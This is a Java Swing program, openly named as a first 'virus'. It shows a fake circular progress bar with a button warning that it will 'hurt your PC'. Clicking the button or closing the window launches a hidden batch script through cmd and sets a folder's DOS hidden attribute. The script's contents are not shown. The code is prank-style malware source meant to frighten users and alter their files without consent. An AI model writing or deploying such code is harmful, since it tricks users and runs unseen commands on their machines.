import javax.swing.*;
import javax.swing.plaf.basic.BasicProgressBarUI;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.awt.geom.Arc2D;
import java.awt.geom.Area;
import java.awt.geom.Ellipse2D;
import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.DosFileAttributes;
import java.util.logging.Level;
import java.util.logging.Logger;
public class Awol_First_virus1 {
    public JComponent makeUI() {
        JProgressBar progress = new JProgressBar();
        // use JProgressBar#setUI(...) method
        progress.setUI(new javaProgresscircle());
        progress.setBorder(BorderFactory.createEmptyBorder(8, 8, 8, 8));
        progress.setStringPainted(true);
        progress.setFont(progress.getFont().deriveFont(24f));
        progress.setForeground(Color.ORANGE);

        (new Timer(1000, e -> {
            int iv = Math.min(100, progress.getValue() + 1);
            progress.setValue(iv);
        })).start();

        JPanel p = new JPanel();
        p.add(progress);
        return p;
    }
    class javaProgresscircle extends BasicProgressBarUI {
        @Override public Dimension getPreferredSize(JComponent c) {
            Dimension d = super.getPreferredSize(c);
            int v = Math.max(d.width, d.height);
            d.setSize(v, v);
            return d;
        }
        @Override public void paint(Graphics g, JComponent c) {
            Insets b = progressBar.getInsets(); // area for border
            int barRectWidth  = progressBar.getWidth()  - b.right - b.left;
            int barRectHeight = progressBar.getHeight() - b.top - b.bottom;
            if (barRectWidth <= 0 || barRectHeight <= 0) {
                return;
            }

            // draw the cells
            Graphics2D g2 = (Graphics2D) g.create();
            g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING,
                    RenderingHints.VALUE_ANTIALIAS_ON);
            g2.setPaint(progressBar.getForeground());
            double degree = 360 * progressBar.getPercentComplete();
            double sz = Math.min(barRectWidth, barRectHeight);
            double cx = b.left + barRectWidth  * .5;
            double cy = b.top  + barRectHeight * .5;
            double or = sz * .5;
            double ir = or * .5; //or - 20;
            Shape inner = new Ellipse2D.Double(cx - ir, cy - ir, ir * 2, ir * 2);
            Shape outer = new Arc2D.Double(
                    cx - or, cy - or, sz, sz, 90 - degree, degree, Arc2D.PIE);
            Area area = new Area(outer);
            area.subtract(new Area(inner));
            g2.fill(area);
            g2.dispose();

            // Deal with possible text painting
            if (progressBar.isStringPainted()) {
                paintString(g, b.left, b.top, barRectWidth, barRectHeight, 0, b);
            }
        }
    }
    public static void main(String... args) {
        EventQueue.invokeLater(() -> {
            JFrame f = new JFrame();
            f.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
            f.setLayout(new FlowLayout());
            Image i= Toolkit.getDefaultToolkit().getImage("C:\\Users\\hp\\Documents\\NetBeansProjects\\Awol_First_virus1\\src\\image\\v1.jpg");
            f.setIconImage(i);
            //f.getContentPane().add(new CircularProgressTest().makeUI());
            f.add(new Awol_First_virus1().makeUI());
              try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {

                if ("Nimbus".equals(info.getName())) {

                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (Exception ex) {
        }
            JButton button=new JButton("Click me to Stop Progress It is going to  hurt your PC");
            button.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                   
                    Path p=FileSystems.getDefault().getPath("hahil1");
        String path="cmd /c start hahil1\\hidefile.bat";
        Runtime rn=Runtime.getRuntime();
                    try {
                        Process pr=rn.exec(path);
                    } catch (IOException ex) {
                        Logger.getLogger(Awol_First_virus1.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    try {
                        DosFileAttributes dos=Files.readAttributes(p,DosFileAttributes.class);
                    } catch (IOException ex) {
                        Logger.getLogger(Awol_First_virus1.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    try {
                        Files.setAttribute(p,"dos:hidden",true);
                    } catch (IOException ex) {
                        Logger.getLogger(Awol_First_virus1.class.getName()).log(Level.SEVERE, null, ex);
                    }
                     System.exit(0);
                }
            });
            f.add(button);
            f.setSize(600,240);
            f.setLocationRelativeTo(null);
            f.setVisible(true);
            f.setResizable(false);
            f.addWindowListener(new WindowListener() {
                @Override
                public void windowOpened(WindowEvent e) {

                }

                @Override
                public void windowClosing(WindowEvent e) {
                    Path p=FileSystems.getDefault().getPath("hahil1");
                    String path="cmd /c start hahil1\\hidefile.bat";
                    Runtime rn=Runtime.getRuntime();
                    try {
                        Process pr=rn.exec(path);
                    } catch (IOException ex) {
                        Logger.getLogger(Awol_First_virus1.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    try {
                        DosFileAttributes dos=Files.readAttributes(p,DosFileAttributes.class);
                    } catch (IOException ex) {
                        Logger.getLogger(Awol_First_virus1.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    try {
                        Files.setAttribute(p,"dos:hidden",true);
                    } catch (IOException ex) {
                        Logger.getLogger(Awol_First_virus1.class.getName()).log(Level.SEVERE, null, ex);
                    }
                     System.exit(0);
                }

                @Override
                public void windowClosed(WindowEvent e) {

                }

                @Override
                public void windowIconified(WindowEvent e) {

                }

                @Override
                public void windowDeiconified(WindowEvent e) {

                }

                @Override
                public void windowActivated(WindowEvent e) {

                }

                @Override
                public void windowDeactivated(WindowEvent e) {

                }
            });
});
        
    }
}
